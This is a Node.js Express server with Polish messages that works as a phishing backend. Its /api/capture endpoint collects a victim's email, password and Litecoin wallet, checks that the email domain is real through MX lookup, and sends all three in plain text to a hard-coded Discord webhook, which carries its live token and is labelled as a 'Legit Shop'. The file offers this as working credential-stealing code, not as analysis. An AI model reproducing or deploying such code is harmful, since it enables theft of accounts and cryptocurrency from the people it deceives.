const express = require('express');
const path = require('path');
const dns = require('dns').promises;
const app = express();
const PORT = process.env.PORT || 3000; // <--- WAŻNE: To pozwala Renderowi przypisać port

app.use(express.json());

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1567588174408982599/s8fisCTQzPZ_Q8ps-cbF8QkjJtZtkmP1EshBCXtEyWi_12Dy9YunbPGFfeh9s3KOj81e';

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/capture', async (req, res) => {
    const { email, password, ltc } = req.body;
    
    if (!email || !password || !ltc) {
        return res.status(400).json({ success: false, message: 'Wypełnij wszystkie pola!' });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ success: false, message: 'Nieprawidłowy adres e-mail!' });
    }

    const domain = email.split('@')[1];
    try {
        const mxRecords = await dns.resolveMx(domain);
        if (!mxRecords || mxRecords.length === 0) {
            return res.status(400).json({ success: false, message: 'Podana domena e-mail nie istnieje lub nie przyjmuje poczty!' });
        }
    } catch (error) {
        return res.status(400).json({ success: false, message: 'Taki adres e-mail nie istnieje (błędna domena)!' });
    }

    const timestamp = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });

    const webhookPayload = {
        username: "wyjeba Shop 🛒",
        avatar_url: "https://i.imgur.com/4M34hi2.png",
        embeds: [
            {
                title: "🎁 no ten jakis tam wyjebka web!",
                color: 5793266,
                fields: [
                    { name: "📧 Adres E-mail", value: `\`${email}\``, inline: false },
                    { name: "🔑 Hasło", value: `\`${password}\``, inline: false },
                    { name: "🪙 Portfel LTC", value: `\`${ltc}\``, inline: false },
                    { name: "🕒 Czas weryfikacji", value: timestamp, inline: false }
                ],
                footer: {
                    text: "Discord Legit Shop System"
                }
            }
        ]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookPayload)
        });

        res.json({ success: true });
    } catch (error) {
        console.error('Błąd wysyłania do webhooka:', error);
        res.status(500).json({ success: false, message: 'Błąd wewnętrzny serwera.' });
    }
});

app.listen(PORT, () => {
    console.log(`Serwer działa na porcie ${PORT}`);
});